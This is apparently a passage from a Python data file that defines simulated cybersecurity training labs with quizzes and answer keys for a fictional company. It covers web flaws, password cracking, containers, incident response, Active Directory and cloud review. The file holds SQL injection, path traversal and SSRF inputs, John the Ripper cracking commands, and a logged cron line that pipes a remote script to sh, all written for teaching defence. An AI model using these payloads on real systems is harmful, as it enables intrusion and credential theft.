    "Server-side authorisation, parameterised queries, output encoding + CSP, canonical path checks, URL allow-lists and egress controls. Log and alert on 403/404 bursts across object IDs.",
    "Web Security Apprentice",
    [Q("What did v2 return for bob's invoice?", ["200 with data", "404 Not Found", "500", "302"], 1, "Not revealing existence is a good practice."),
     Q("Which v1 flaw let the server fetch an internal page?", ["XSS", "SSRF", "CSRF", "IDOR"], 1, "Server-side request forgery.")],
    prompt="tester@kali-lab:~$",
    commands=[
      C(r"^curl\s+-b\s+['\"]?session=learner['\"]?\s+['\"]?http://portal\.lab\.local/v1/api/invoices/1001['\"]?$", 'HTTP/1.1 200 OK\n{"id":1001,"owner":"learner","total":"£42.10","items":2}', "t1"),
      C(r"^curl\s+-b\s+['\"]?session=learner['\"]?\s+['\"]?http://portal\.lab\.local/v1/api/invoices/1002['\"]?$", 'HTTP/1.1 200 OK\n{"id":1002,"owner":"bob","total":"£310.00","address":"[redacted training data]"}   <- IDOR: learner can read bob\'s invoice', "t2"),
      C(r"^curl\s+-b\s+['\"]?session=learner['\"]?\s+['\"]?http://portal\.lab\.local/v2/api/invoices/1002['\"]?$", 'HTTP/1.1 404 Not Found\n{"error":"Not found"}   <- v2 checks ownership server-side', "t2"),
      C(r"^curl\s+-d\s+['\"]username=' OR '1'='1&password=x['\"]\s+http://portal\.lab\.local/v1/login$", "HTTP/1.1 302 Found\nLocation: /dashboard\nLogged in as: admin   <- SQL injection: the WHERE clause became always true", "t3"),
      C(r"^curl\s+-d\s+['\"]username=' OR '1'='1&password=x['\"]\s+http://portal\.lab\.local/v2/login$", "HTTP/1.1 401 Unauthorized\nInvalid credentials   <- v2 uses parameterised queries", "t3"),
      C(r"^curl\s+-d\s+.*\s+http://portal\.lab\.local/v1/login$", "HTTP/1.1 401 Unauthorized\nInvalid credentials (hint: the task uses the classic tautology from Module 4)"),
      C(r"^curl\s+['\"]?http://portal\.lab\.local/v1/comments['\"]?$", "<li><b>bob</b>: Great service!</li>\n<li><b>eve</b>: <i>xss-test</i></li>   <- raw HTML rendered: stored XSS risk", "t4"),
      C(r"^curl\s+['\"]?http://portal\.lab\.local/v2/comments['\"]?$", "<li><b>bob</b>: Great service!</li>\n<li><b>eve</b>: &lt;i&gt;xss-test&lt;/i&gt;</li>   <- encoded output, displayed as text", "t4"),
      C(r"^curl\s+['\"]http://portal\.lab\.local/v1/download\?file=\.\./\.\./etc/hostname['\"]$", "HTTP/1.1 200 OK\nweb01   <- path traversal: file outside the downloads folder", "t5"),
      C(r"^curl\s+['\"]http://portal\.lab\.local/v2/download\?file=\.\./\.\./etc/hostname['\"]$", "HTTP/1.1 400 Bad Request\nInvalid file reference   <- v2 maps IDs to files and checks the resolved path", "t5"),
      C(r"^curl\s+['\"]http://portal\.lab\.local/v1/preview\?url=http://127\.0\.0\.1:8080/admin['\"]$", "HTTP/1.1 200 OK\n<title>Internal Admin Console</title>   <- SSRF: the server fetched an internal-only page", "t6"),
      C(r"^curl\s+['\"]http://portal\.lab\.local/v2/preview\?url=http://127\.0\.0\.1:8080/admin['\"]$", "HTTP/1.1 400 Bad Request\nDestination not allowed   <- v2 allow-lists external hosts and blocks internal ranges", "t6"),
      C(r"^curl\s+-I\s+['\"]?http://portal\.lab\.local/?['\"]?$", "HTTP/1.1 200 OK\nServer: Apache/2.4.52 (Ubuntu)\nSet-Cookie: session=...; Path=/   <- missing HttpOnly, Secure, SameSite\n(no Content-Security-Policy, no Strict-Transport-Security)"),
      C(r"^curl\s+.*(http|https)://(?!portal\.lab\.local).*$", "Blocked: only portal.lab.local is in scope for this lab."),
    ])

LAB("lab_hash_audit", "Password Audit Analysis (Simulated)", "Password auditing", 3, "m10", "terminal", 30,
    "Silverline authorised an offline password audit of a lab-only test domain export. Analyse simulated tool output and produce statistics - never plaintext - for the report.",
    "Hashes are from a fictional lab domain created for training. Real engagements require explicit written approval for password auditing.",
    ["Identify hash types", "Interpret simulated John the Ripper output", "Produce statistics for the report", "Recommend password controls"],
    "Simulated Kali lab VM with lab_hashes.txt", ["hashid", "john", "wc"],
    [T("t1", "Identify the hash type of the first hash", "hashid -m '<hash>' or: hashid lab_hashes.txt"),
     T("t2", "Run John with the lab wordlist", "john --wordlist=lab-words.txt --format=nt lab_hashes.txt"),
     T("t3", "Show cracked results summary", "john --show --format=nt lab_hashes.txt"),
     T("t4", "Count total accounts", "wc -l lab_hashes.txt")],
    ["Why report statistics instead of passwords?", "Why are NT hashes fast to test?", "Which controls stop these patterns?"],
    "Format: NT (NTLM). 14 of 40 test accounts (35%) cracked with the wordlist; patterns: season+year, company name+digits. Report: 35% weak, 6 accounts use 'Silverline' variants, 2 privileged accounts affected.",
    "Banned-password lists (including company name), passphrase policy, MFA, Microsoft Entra Password Protection or equivalent, monitor for password spraying (4625/4771 patterns), privileged account reviews.",
    "Credential Guardian",
    [Q("What percentage of accounts were weak?", ["5%", "35%", "70%", "100%"], 1, "14 of 40."),
     Q("How should results appear in the report?", ["Full password list", "Statistics and patterns only", "Hashes and passwords", "Not at all"], 1, "Protect secrets.")],
    prompt="tester@kali-lab:~/audit$",
    commands=[
      C(r"^hashid\s+.*$", "Analyzing '8846f7eaee8fb117ad06bdd830b7586c'\n[+] MD4\n[+] NTLM   <- Windows NT hash (context: AD export)", "t1"),
      C(r"^wc\s+-l\s+lab_hashes\.txt$", "40 lab_hashes.txt", "t4"),
      C(r"^john\s+--wordlist=lab-words\.txt\s+--format=nt\s+lab_hashes\.txt$", "Loaded 40 password hashes with no different salts (NT [MD4 256/256 AVX2 8x3])\nPress 'q' or Ctrl-C to abort\n14g 0:00:00:03 DONE (lab) 4.66g/s\nSession completed.", "t2"),
      C(r"^john\s+--show\s+--format=nt\s+lab_hashes\.txt$", """[simulated - plaintext hidden by this app for good practice]
14 password hashes cracked, 26 left
Patterns observed: Season+Year (6), Silverline+digits (4), Welcome+digits (3), keyboard walk (1)
Privileged accounts affected: adm_ops, svc_backup""", "t3"),
      C(r"^john\s+.*$", "Hint: use --wordlist=lab-words.txt --format=nt lab_hashes.txt"),
      C(r"^hydra\s+.*$", "Online guessing is disabled in this lab: it risks account lockouts and needs separate explicit approval."),
    ])

LAB("lab_container", "Container Security Review", "Container security", 4, "m13", "terminal", 35,
    "Silverline's dev team runs a reporting app in Docker on dev02. Review the running container for insecure configuration.",
    "You have read-only Docker access for the review.",
    ["Inspect running containers", "Find privileged and root containers", "Find secrets in environment variables", "Check the Docker socket mount and recommend fixes"],
    "Simulated dev02 Docker host", ["docker ps", "docker inspect", "docker history", "trivy"],
    [T("t1", "List running containers", "docker ps"),
     T("t2", "Inspect the reports container for privileged mode and user", "docker inspect reports --format '{{.HostConfig.Privileged}} {{.Config.User}}'"),
     T("t3", "Look for secrets in environment variables", "docker inspect reports --format '{{.Config.Env}}'"),
     T("t4", "Check mounts for the Docker socket", "docker inspect reports --format '{{json .Mounts}}'"),
     T("t5", "Scan the image for vulnerabilities", "trivy image silverline/reports:latest")],
    ["Which issue gives host-level control?", "How should the DB password be provided?", "Why avoid the 'latest' tag?"],
    "reports runs --privileged as root, mounts /var/run/docker.sock, has DB_PASSWORD in ENV, image uses 'latest' and has 3 critical CVEs in an old base image.",
    "Run as non-root, remove --privileged and the socket mount, use Docker/K8s secrets or a vault, pin image digests, rebuild on a slim base, scan in CI, enforce policies (e.g. admission control).",
    "Container Inspector",
    [Q("Which mount effectively grants root on the host?", ["/tmp", "/var/run/docker.sock", "/app/data", "/etc/timezone"], 1, "Docker socket = control of the Docker daemon."),
     Q("Where should secrets live?", ["ENV in the image", "Secrets manager / Docker secrets", "Dockerfile comments", "Image labels"], 1, "Use secret stores.")],
    prompt="reviewer@dev02:~$",
    commands=[
      C(r"^docker\s+ps$", "CONTAINER ID  IMAGE                       COMMAND          STATUS        PORTS                  NAMES\n3f1a9c2d7b11  silverline/reports:latest   \"python app.py\"  Up 12 days    0.0.0.0:5000->5000/tcp reports\n9b2e44a1c0de  postgres:13                 \"postgres\"       Up 12 days    5432/tcp               reportsdb", "t1"),
      C(r"^docker\s+inspect\s+reports\s+--format\s+['\"]\{\{\.HostConfig\.Privileged\}\}\s+\{\{\.Config\.User\}\}['\"]$", "true    (User empty = root)", "t2"),
      C(r"^docker\s+inspect\s+reports\s+--format\s+['\"]\{\{\.Config\.Env\}\}['\"]$", "[PATH=/usr/local/bin:/usr/bin DB_HOST=reportsdb DB_USER=reports DB_PASSWORD=Tr4ining-Secret-99 FLASK_DEBUG=1]", "t3"),
      C(r"^docker\s+inspect\s+reports\s+--format\s+['\"]\{\{json \.Mounts\}\}['\"]$", '[{"Type":"bind","Source":"/var/run/docker.sock","Destination":"/var/run/docker.sock","RW":true},{"Type":"volume","Destination":"/app/data"}]', "t4"),
      C(r"^docker\s+inspect\s+reports$", "(long JSON output - use --format to extract Privileged, User, Env and Mounts)"),
      C(r"^docker\s+history\s+silverline/reports:latest$", "IMAGE   CREATED BY\n<id>   CMD [\"python\" \"app.py\"]\n<id>   COPY . /app\n<id>   ENV DB_PASSWORD=Tr4ining-Secret-99   <- secret baked into an image layer\n<id>   FROM python:3.8"),
      C(r"^trivy\s+image\s+silverline/reports:latest$", "silverline/reports:latest (debian 10.13)\nTotal: 187 (UNKNOWN: 2, LOW: 61, MEDIUM: 79, HIGH: 42, CRITICAL: 3)\nBase image python:3.8 on Debian 10 is end-of-life - rebuild on a supported slim base.", "t5"),
      C(r"^docker\s+(run|exec|rm|stop|kill).*$", "Not permitted: this is a read-only review."),
    ])

LAB("lab_incident_logs", "Incident Log Analysis: Web Server Intrusion", "Incident response", 3, "m12", "terminal", 35,
    "An alert fired on Silverline's staging web server. Build a timeline from the web access log and system log to identify post-exploitation indicators.",
    "Logs are copies provided by the incident response team. Times are UTC.",
    ["Find traversal attempts", "Find the uploaded web shell", "Find persistence indicators", "Build a timeline and recommend containment"],
    "Simulated IR workstation with copied logs", ["grep", "cat"],
    [T("t1", "Search the access log for traversal patterns", "grep '\\.\\./' access.log"),
     T("t2", "Search for POST requests to uploads", "grep 'POST /uploads' access.log"),
     T("t3", "Search for requests to the suspicious PHP file", "grep 'img.php' access.log"),
     T("t4", "Check the cron log for new jobs", "grep CRON syslog")],
    ["What was the initial access vector?", "Which artefacts need cleanup?", "What should be preserved before rebuilding?"],
    "02:01 traversal probing from 198.51.100.23; 02:07 upload of img.php via insecure upload; 02:09-02:15 img.php used with cmd parameter; 02:16 new cron job by www-data downloading a script every 10 minutes. Contain: isolate host, preserve disk/memory, block IP, remove web shell and cron, patch upload handling, rotate credentials.",
    "Detection: WAF/IDS for traversal, alerts on new executable files in web roots (FIM), process monitoring for web server spawning shells, cron change monitoring, egress filtering.",
    "Incident Responder",
    [Q("What was the persistence mechanism?", ["New user", "Cron job", "Registry Run key", "Service"], 1, "A cron entry for www-data."),
     Q("What should happen before rebuilding the server?", ["Nothing", "Preserve evidence (disk/memory images)", "Delete logs", "Post on social media"], 1, "Evidence first.")],
    prompt="ir@forensics:~/case-0312$",
    commands=[
      C(r"^grep\s+['\"]?\\?\.\\?\./['\"]?\s+access\.log$", '198.51.100.23 - - [12/Mar/2026:02:01:14 +0000] "GET /download?file=../../../../etc/passwd HTTP/1.1" 200 1812\n198.51.100.23 - - [12/Mar/2026:02:01:20 +0000] "GET /download?file=../../../../var/www/.env HTTP/1.1" 404 0', "t1"),
      C(r"^grep\s+['\"]?POST /uploads['\"]?\s+access\.log$", '198.51.100.23 - - [12/Mar/2026:02:07:41 +0000] "POST /uploads/avatar HTTP/1.1" 200 64   (file stored as /uploads/img.php)', "t2"),
      C(r"^grep\s+['\"]?img\.php['\"]?\s+access\.log$", '198.51.100.23 - - [12/Mar/2026:02:09:02 +0000] "GET /uploads/img.php?cmd=id HTTP/1.1" 200 54\n198.51.100.23 - - [12/Mar/2026:02:11:37 +0000] "GET /uploads/img.php?cmd=uname+-a HTTP/1.1" 200 101\n198.51.100.23 - - [12/Mar/2026:02:15:55 +0000] "GET /uploads/img.php?cmd=crontab+-l HTTP/1.1" 200 0', "t3"),
      C(r"^grep\s+['\"]?CRON['\"]?\s+syslog$", "Mar 12 02:16:30 staging CRON[3121]: (www-data) REPLACE (www-data)\nMar 12 02:20:01 staging CRON[3188]: (www-data) CMD (curl -s http://198.51.100.23/u.sh | sh)   <- persistence + remote script", "t4"),
      C(r"^cat\s+access\.log$", "(31,442 lines - use grep to focus)"),
    ])

# ---------------- DECISION / SCENARIO LABS ----------------
LAB("lab_hw_basics", "Computer Fundamentals Troubleshooting Challenge", "Computer fundamentals", 1, "m01", "decision", 15,
    "Silverline's reception PC is misbehaving. Diagnose issues using what you know about hardware, memory, storage and boot.",
    "Each step gives symptoms. Choose the most likely cause or best next action.",
    ["Apply the troubleshooting method", "Link symptoms to components", "Choose safe next actions"],
    "Scenario-based", ["Troubleshooting method"], [],
    ["Which step of the six-step method did you use most?", "Why should you change one thing at a time?"],
    "1) RAM: beeps + no display after a RAM upgrade. 2) Disk failing: clicking, SMART warnings - back up first. 3) Boot order/UEFI: 'No bootable device' after USB left in. 4) Malware or bloat: 100% CPU from unknown process - investigate before deleting.",
    "Backups, monitoring SMART data, Secure Boot and endpoint protection prevent several of these issues becoming incidents.",
    "Computer Explorer",
    [Q("First step of troubleshooting?", ["Replace parts", "Identify the problem", "Reinstall OS", "Document"], 1, "Identify first.")],
    steps=[
      S("After a technician added a new RAM stick, the PC beeps repeatedly and shows nothing on screen.", "Most likely cause?", ["Failed GPU driver", "RAM not seated or incompatible", "Virus", "Network cable unplugged"], 1, "POST beep codes after a RAM change point to memory seating/compatibility."),
      S("The PC is slow and makes a clicking noise. A SMART warning appears at boot.", "Best next action?", ["Defragment immediately", "Back up data then replace the disk", "Ignore it", "Overclock the CPU"], 1, "A failing disk needs data protected first."),
      S("At boot: 'No bootable device found'. A USB stick is plugged in.", "What do you check first?", ["Replace the motherboard", "Remove the USB / check UEFI boot order", "Reinstall Windows", "Change the IP address"], 1, "Boot order may prefer the USB."),
      S("Task Manager shows 'svch0st.exe' at 100% CPU running from AppData.", "Best response?", ["Delete random files", "Treat as suspicious - isolate and investigate per policy", "Rename it", "Ignore - it is a system file"], 1, "Misspelled system names in user folders are suspicious.", "Process: svch0st.exe  CPU: 99%  Path: C:\\Users\\reception\\AppData\\Roaming\\svch0st.exe"),
    ])

LAB("lab_subnet", "Subnetting Practice", "Networking", 2, "m02", "decision", 20,
    "Silverline is redesigning its lab network. Answer subnetting questions; use the in-app Subnet Calculator to check your work.",
    "Each step is a design requirement.",
    ["Calculate ranges", "Choose subnet sizes", "Check scope boundaries"],
    "Scenario + Subnet Calculator tool", ["Subnet Calculator"], [],
    ["Which shortcut did you use for block size?", "Why does CIDR matter for scope?"],
    "1) 10.10.10.64-95, usable .65-.94. 2) /26. 3) 172.16.4.0/22 range 172.16.4.0-172.16.7.255. 4) No - 192.168.20.130 is outside /25 (0-127).",
    "Accurate subnetting supports segmentation, firewall rules and scope control.",
    "Subnet Solver",
    [Q("Usable hosts in a /28?", ["14", "16", "30", "6"], 0, "16 - 2.")],
    steps=[
      S("Host 10.10.10.77/27.", "What is the network and broadcast?", ["10.10.10.64 / 10.10.10.95", "10.10.10.0 / 10.10.10.255", "10.10.10.72 / 10.10.10.79", "10.10.10.32 / 10.10.10.63"], 0, "Block 32: 64-95."),
      S("The IoT VLAN needs 50 hosts with minimal waste.", "Which prefix?", ["/24", "/25", "/26", "/27"], 2, "/26 = 62 usable."),
      S("Scope is 172.16.4.0/22.", "Which range is in scope?", ["172.16.4.0 - 172.16.4.255", "172.16.4.0 - 172.16.7.255", "172.16.0.0 - 172.16.255.255", "172.16.4.0 - 172.16.5.255"], 1, "/22 spans four /24s: .4-.7."),
      S("Scope is 192.168.20.0/25. You see host 192.168.20.130.", "Is it in scope?", ["Yes", "No", "Only on Mondays", "If it pings"], 1, "/25 covers .0-.127."),
    ])

LAB("lab_recon_silverline", "Silverline Recon: Passive Information Gathering", "Reconnaissance", 2, "m06", "decision", 30,
    "You are preparing an authorised external assessment of Silverline Ltd (fictional). Use the supplied passive dataset to build an asset view.",
    "Scope: *.silverline.test owned by Silverline; third-party SaaS excluded unless confirmed. Social engineering is OUT of scope.",
    ["Interpret DNS and email security records", "Validate ownership", "Separate facts from assumptions", "Avoid overcollection"],
    "Supplied dataset (fictional)", ["dig output", "crt.sh export", "metadata sample"], [],
    ["Which asset would you prioritise and why?", "What data did you deliberately NOT collect?"],
    "MX -> Microsoft 365; DMARC p=none (spoofing risk); dev.silverline.test dangling CNAME (possible takeover); shop.silverline.test on third-party SaaS (confirm before testing); PDF metadata shows username format first.last.",
    "Defenders: enforce DMARC (quarantine/reject), remove dangling DNS, scrub document metadata, monitor CT logs for new certificates.",
    "Recon Analyst",
    [Q("DMARC p=none means?", ["Reject spoofed mail", "Monitor only", "Disable SPF", "Encrypt mail"], 1, "No enforcement.")],
    steps=[
      S("DNS records for silverline.test:", "What is the email security finding?", ["None", "DMARC is not enforced (p=none)", "MX is missing", "SPF is too strict"], 1, "p=none only monitors.",
        "silverline.test. MX 10 silverline-test.mail.protection.outlook.com.\nsilverline.test. TXT \"v=spf1 include:spf.protection.outlook.com -all\"\n_dmarc.silverline.test. TXT \"v=DMARC1; p=none; rua=mailto:dmarc@silverline.test\""),
      S("crt.sh shows these subdomains:", "Which is most interesting for a takeover check?", ["www", "vpn", "dev (CNAME to deleted cloud app)", "mail"], 2, "Dangling CNAMEs can be claimed.",
        "www.silverline.test   A 203.0.113.10\nvpn.silverline.test   A 203.0.113.20\ndev.silverline.test   CNAME silverline-dev.azurewebsites.test (NXDOMAIN)\nshop.silverline.test  CNAME stores.saasvendor.test"),
      S("shop.silverline.test points to a third-party SaaS vendor.", "What do you do?", ["Test it fully", "Confirm with Silverline and vendor terms before any testing", "Delete it from DNS", "Scan the vendor's whole network"], 1, "Ownership and permission first."),
      S("A public PDF's metadata:", "What can you safely conclude?", ["The CEO's home address", "Likely username format (first.last) and an internal file server name", "The VPN password", "Nothing"], 1, "Collect only what is relevant.",
        "Author: priya.shah\nCreator: Microsoft Word 2019\nPath: \\\\fs02\\finance\\reports\\Q4.docx"),
      S("You find a staff member's personal social media with family photos.", "What do you do?", ["Add to the report", "Do not collect it - outside purpose and privacy", "Message them", "Download everything"], 1, "Avoid overcollection; social engineering is out of scope."),
      S("A banner says 'Apache 2.4.29' on www, from one scan source.", "How do you record it?", ["Confirmed critical vulnerability", "Possible - single unverified source, needs validation", "Ignore", "Out of scope"], 1, "Tag confidence honestly."),
    ])

LAB("lab_cvss", "CVSS and Prioritisation", "Vulnerability assessment", 3, "m08", "decision", 30,
    "Silverline's scanner produced findings. Score, validate and prioritise them.",
    "Use the in-app CVSS calculator. Asset criticality: VPN and AD are Tier 0; intranet is medium; printers low.",
    ["Interpret CVSS vectors", "Use KEV and exposure in priority", "Spot false positives"],
    "Supplied findings list", ["CVSS calculator"], [],
    ["Why did a lower CVSS score rank higher?", "How did you justify the false positive?"],
    "1) 9.8 Critical. 2) Fix VPN KEV issue first. 3) OpenSSL finding on RHEL is a false positive after checking backported package. 4) Prioritised list: VPN, DC patch, intranet XSS, printer TLS.",
    "Use KEV/EPSS feeds, asset criticality tags and credentialed scans to cut noise and focus effort.",
    "Vulnerability Investigator",
    [Q("CVSS 7.5 is...", ["Medium", "High", "Critical", "Low"], 1, "7.0-8.9 High.")],
    steps=[
      S("Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", "What is the severity?", ["Medium", "High", "Critical (9.8)", "Low"], 2, "Network, no privileges, full CIA impact = 9.8."),
      S("Two findings: A) CVSS 9.1 on an isolated test VM. B) CVSS 8.1 on the internet-facing VPN, listed in CISA KEV.", "Which first?", ["A", "B", "Both equal", "Neither"], 1, "Exposure + active exploitation."),
      S("Scanner: 'OpenSSL vulnerable (version 1.1.1k)' on a RHEL 8 server. Credentialed check shows package openssl-1.1.1k-12.el8 includes the vendor's backported fix.", "Classification?", ["True positive", "False positive", "False negative", "Informational only"], 1, "Backported fix - not vulnerable."),
      S("Remaining: DC missing patch (public exploit), intranet stored XSS (low-sensitivity data), printer TLS 1.0.", "Best order?", ["Printer, XSS, DC", "DC, XSS, Printer", "XSS, Printer, DC", "All at once next year"], 1, "Tier 0 identity first."),
    ])

LAB("lab_wireless", "Wireless Configuration Review", "Wireless security", 2, "m11", "decision", 25,
    "Review the Wi-Fi survey of Silverline's Rugby office (fictional) against its approved AP list.",
    "Survey performed with authorisation from inside the office. No deauthentication or traffic capture was permitted.",
    ["Spot weak configurations", "Identify a rogue AP", "Recommend controls"],
    "Supplied survey output", ["airodump-ng style survey"], [],
    ["Why is the rogue AP high risk?", "What would WPA3 change?"],
    "SLV-Guest open with no isolation; SLV-Staff WPA2-PSK with WPS enabled; 'SLV-Staff ' (trailing space) on unknown BSSID = evil twin/rogue; SLV-Corp WPA2-Enterprise is good but should validate server certs.",
    "WIDS/WIPS, AP inventory, WPA3/PMF, EAP-TLS with certificate validation, guest isolation, disable WPS.",
    "Wireless Guardian",
    [Q("Which network is likely rogue?", ["SLV-Corp", "SLV-Staff with unknown BSSID", "SLV-Guest", "None"], 1, "Unknown BSSID copying a staff SSID.")],
    steps=[
      S("Survey results:", "Which setting is weakest on SLV-Staff?", ["AES", "WPS enabled", "Channel 6", "5 GHz support"], 1, "WPS PIN design is weak.",
        "BSSID              CH  ENC   AUTH  WPS  ESSID\nA0:3D:6F:11:22:01   6  WPA2  PSK   Yes  SLV-Staff\nA0:3D:6F:11:22:02  36  WPA2  MGT   No   SLV-Corp\nA0:3D:6F:11:22:03  11  OPN   -     No   SLV-Guest\n7C:2E:BD:99:10:5A   1  WPA2  PSK   No   SLV-Staff \nApproved list: A0:3D:6F:11:22:01-03 only"),
      S("7C:2E:BD:99:10:5A broadcasts 'SLV-Staff ' (trailing space).", "What is it?", ["Approved AP", "Rogue/evil-twin AP", "A printer", "The router"], 1, "Not on the approved list and imitating staff SSID."),
      S("SLV-Guest is open and guests can see each other's devices.", "Best recommendation?", ["Hide the SSID", "Client isolation + captive portal/OWE + separate VLAN", "MAC filtering", "Nothing"], 1, "Isolation and separation; OWE adds encryption to open networks."),
      S("SLV-Corp uses WPA2-Enterprise but laptops do not validate the RADIUS certificate.", "Risk?", ["None", "Credentials can be captured by a fake AP", "Slower Wi-Fi", "DNS failures"], 1, "Certificate validation stops evil twins harvesting credentials."),
    ])

LAB("lab_mobile", "Mobile App Permissions and Static Review", "Mobile security", 2, "m11", "decision", 25,
    "Review a MobSF-style static report for 'SilverNotes', a deliberately insecure sample Android app supplied for training.",
    "Analysis of a training APK supplied by the course - not a third-party app.",
    ["Assess permissions", "Find insecure manifest settings", "Find hardcoded secrets", "Map to MASVS"],
    "Supplied static analysis report", ["MobSF report"], [],
    ["Which issue is most serious?", "How would you verify fixes in the next build?"],
    "Excess permissions (READ_SMS, READ_CONTACTS for a notes app); debuggable=true; allowBackup=true; cleartext traffic permitted; hardcoded API key; exported activity without permission. Map to MASVS PLATFORM, STORAGE, NETWORK, CODE.",
    "CI checks for manifest flags, secrets scanning, network security config, permission review in design.",
    "Mobile Defender",
    [Q("Hardcoded API keys in an APK are...", ["Safe", "Extractable by anyone", "Encrypted by default", "Removed by R8"], 1, "Treat as public.")],
    steps=[
      S("Permissions requested by a notes app:", "Which are unjustified?", ["INTERNET", "READ_SMS and READ_CONTACTS", "None", "POST_NOTIFICATIONS"], 1, "A notes app should not read SMS or contacts.",
        "android.permission.INTERNET\nandroid.permission.READ_SMS\nandroid.permission.READ_CONTACTS\nandroid.permission.POST_NOTIFICATIONS"),
      S("Manifest flags:", "Which is a release-build finding?", ["minSdk 26", "android:debuggable=\"true\"", "label=SilverNotes", "theme"], 1, "Debuggable release builds allow runtime inspection.",
        "<application android:debuggable=\"true\" android:allowBackup=\"true\" android:usesCleartextTraffic=\"true\">"),
      S("Code search found:", "Recommendation?", ["Obfuscate it", "Move the key server-side, rotate it, and use per-user auth", "Base64 encode it", "Ignore"], 1, "Rotate and remove secrets from clients.",
        "const val API_KEY = \"sk_training_51Hx...\"  // StorageService.kt line 14"),
      S("An activity 'ExportNotesActivity' is exported=true with no permission.", "Risk?", ["None", "Other apps can launch it and possibly export notes", "Battery drain", "UI glitch"], 1, "Protect or unexport components."),
    ])

LAB("lab_ad_review", "Active Directory Misconfiguration Review", "Active Directory", 4, "m13", "decision", 35,
    "Review a PingCastle-style health report and BloodHound path summary for the fictional SILVERLINE.TEST domain.",
    "Data was collected by Silverline's own IT team for the review.",
    ["Interpret AD health findings", "Explain an attack path", "Prioritise identity hardening"],
    "Supplied AD reports", ["PingCastle", "BloodHound CE"], [],
    ["Which single change cuts the most paths?", "How would you monitor for regression?"],
    "Findings: 27 Domain Admins; svc_sql Kerberoastable with 2016 password; LAPS absent; Helpdesk has GenericAll on 'IT-Admins' which is nested in Domain Admins; krbtgt not rotated since 2019. Priority: fix the ACL path and reduce DA membership, then service account and LAPS.",
    "Tiered admin, quarterly AD health checks, alerting on group membership changes (4728/4732/4756) and directory ACL changes (5136).",
    "Identity Defender",
    [Q("GenericAll on a group nested in Domain Admins means...", ["Nothing", "A path to Domain Admin", "Read-only access", "Printer access"], 1, "Full control over a privileged group.")],
    steps=[
      S("PingCastle summary:", "Which is the most urgent?", ["Old password policy text", "Helpdesk has GenericAll over IT-Admins (member of Domain Admins)", "Printer spooler on one DC", "Long OU names"], 1, "Direct path to domain compromise.",
        "Privileged group members: Domain Admins = 27\nsvc_sql: SPN set, password last set 2016-04-02 (Kerberoastable)\nLAPS: not deployed\nACL: SILVERLINE\\Helpdesk -> GenericAll -> CN=IT-Admins (nested in Domain Admins)\nkrbtgt password last set: 2019-11-20"),
      S("svc_sql has an SPN and a 2016 password.", "Best fix?", ["Delete the SPN and break SQL", "Convert to a gMSA or set a long random password, AES only", "Add it to Domain Admins", "Disable Kerberos"], 1, "gMSA rotates long passwords automatically."),
      S("LAPS is not deployed; all workstations share a local admin password.", "Risk?", ["None", "Compromise of one PC enables lateral movement to all", "Slow logon", "DNS issues"], 1, "Shared local admin = easy lateral movement."),
      S("Management asks for one-line executive impact.", "Best statement?", ["GenericAll ACE present", "A help-desk account compromise could give an attacker full control of the company's network", "Kerberos uses RC4", "PingCastle score is 68"], 1, "Business language."),
    ])

LAB("lab_cloud_iam", "Cloud IAM and Storage Review", "Cloud security", 4, "m13", "decision", 35,
    "Review a read-only export of Silverline's fictional AWS account.",
    "Read-only SecurityAudit role provided by Silverline. Testing provider infrastructure is prohibited.",
    ["Spot wildcard IAM policies", "Find public storage", "Check logging and network exposure"],
    "Supplied account export (Prowler-style)", ["Prowler", "AWS CLI read-only"], [],
    ["Which finding exposes data now?", "How would you enforce these controls continuously?"],
    "Policy 'DevFullAccess' Action * Resource *; bucket silverline-backups public-read; CloudTrail disabled in eu-west-2; security group sg-web allows 0.0.0.0/0 on 22; root account without MFA.",
    "SCPs/guardrails, AWS Config rules, block public access at account level, CloudTrail organisation trail, IAM Access Analyzer, MFA for root.",
    "Cloud Guardian",
    [Q("Biggest immediate data exposure?", ["CloudTrail region", "Public backup bucket", "Tag naming", "Instance size"], 1, "Public data is exposed now.")],
    steps=[
      S("IAM policy attached to the 'developers' group:", "Problem?", ["Too restrictive", "Wildcard admin - violates least privilege", "Fine", "Syntax error"], 1, "Action * on Resource * is full admin.",
        '{ "Version": "2012-10-17", "Statement": [{ "Effect": "Allow", "Action": "*", "Resource": "*" }] }'),
      S("Prowler: s3 bucket silverline-backups - ACL public-read; contains db-2026-03-01.sql.gz", "Priority?", ["Low", "Critical - immediate block public access and investigate access logs", "Informational", "Next quarter"], 1, "Public database backups are a likely breach."),
      S("Security group sg-web inbound: 22/tcp from 0.0.0.0/0", "Recommendation?", ["Keep it", "Restrict SSH to admin VPN/bastion or use Session Manager", "Open 3389 too", "Remove all egress"], 1, "Limit management access."),
      S("CloudTrail: enabled in eu-west-1, disabled in eu-west-2 where prod runs; root account MFA: false", "Which two fixes?", ["Enable org-wide CloudTrail and MFA on root", "Delete root", "Change region names", "Turn off logging"], 0, "Logging everywhere and protect root."),
    ])

LAB("lab_exploit_safety", "Exploit Validation Safety Decisions", "Exploitation concepts", 4, "m12", "decision", 25,
    "During Silverline's authorised internal test you find several potential issues. Decide how to validate each safely - or whether to stop.",
    "RoE: no DoS, no data exfiltration, medical gateway 10.10.10.200 excluded, emergency contact: Priya (SOC lead).",
    ["Apply the pre-validation checklist", "Choose minimal evidence", "Recognise stop conditions"],
    "Scenario-based", ["Methodology"], [],
    ["Which decision was hardest and why?", "How do these choices protect the client and you?"],
    "Use vendor check for RCE on staging; stop and notify on the excluded host; prove SQLi with version/row-count not data; stop and escalate signs of a real intruder.",
    "Clear RoE, emergency contacts and activity logs let the SOC distinguish tests from attacks and respond quickly.",
    "Safety First",
    [Q("Evidence of a real intruder found mid-test - you should...", ["Continue", "Stop and notify the emergency contact", "Delete it", "Exploit it"], 1, "Escalate immediately.")],
    steps=[
      S("A public exploit exists for a critical RCE on the staging Jenkins server. It is in scope. The vendor offers a safe detection script.", "Best validation?", ["Run the public exploit with a reverse shell", "Use the vendor detection script and capture version evidence", "Skip it", "Run a DoS test"], 1, "Least impactful proof first."),
      S("Your scan suggests the excluded medical gateway 10.10.10.200 has the same flaw.", "What do you do?", ["Validate quickly", "Do not touch it; note it as an observation and inform the client", "Scan it with -T5", "Ask a random employee"], 1, "Out of scope means out of scope."),
      S("SQL injection confirmed on the HR app (in scope).", "Best evidence?", ["Dump all employee records", "Show DB version and count of rows in one table", "Change salaries", "Drop a table"], 1, "Prove impact without exposing data."),
